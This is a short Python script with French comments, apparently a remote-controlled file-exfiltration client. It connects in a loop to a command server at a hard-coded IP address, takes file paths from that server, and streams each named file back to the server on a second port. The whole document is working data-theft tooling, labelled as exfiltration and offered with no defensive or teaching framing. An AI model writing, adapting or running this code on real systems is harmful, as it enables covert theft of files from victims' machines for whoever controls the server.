#!/usr/bin/python3
import socket
import os

SERVER_IP = "192.168.1.84"  # Adresse du serveur
COMMAND_PORT = 5570  # Port d'écoute des commandes
FILE_PORT = 5562  # Port pour envoyer le fichier

def send_file(file_path):
    """ Envoie un fichier au serveur """
    if not os.path.exists(file_path):
        print(f"[!] Erreur: Le fichier {file_path} n'existe pas.")
        return

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((SERVER_IP, FILE_PORT))

        # Envoyer le nom du fichier
        sock.sendall(os.path.basename(file_path).encode() + b"\n")

        # Lire et envoyer le fichier
        with open(file_path, "rb") as f:
            while chunk := f.read(4096):
                sock.sendall(chunk)

        print(f"[✔] Fichier {file_path} envoyé avec succès.")

    except Exception as e:
        print(f"[!] Erreur lors de l'envoi : {e}")
    finally:
        sock.close()

def listen_for_exfil():
    """ Écoute les commandes du serveur et exécute l’exfiltration. """
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_IP, COMMAND_PORT))
            print("[+] Connecté au serveur pour exfiltration.")
            
            while True:
                file_path = sock.recv(1024).decode().strip()
                if file_path:
                    print(f"[+] Demande d'exfiltration reçue : {file_path}")
                    send_file(file_path)

        except Exception as e:
            print(f"[!] Erreur de connexion au serveur : {e}, reconnexion en cours...")
            sock.close()

if __name__ == "__main__":
    listen_for_exfil()
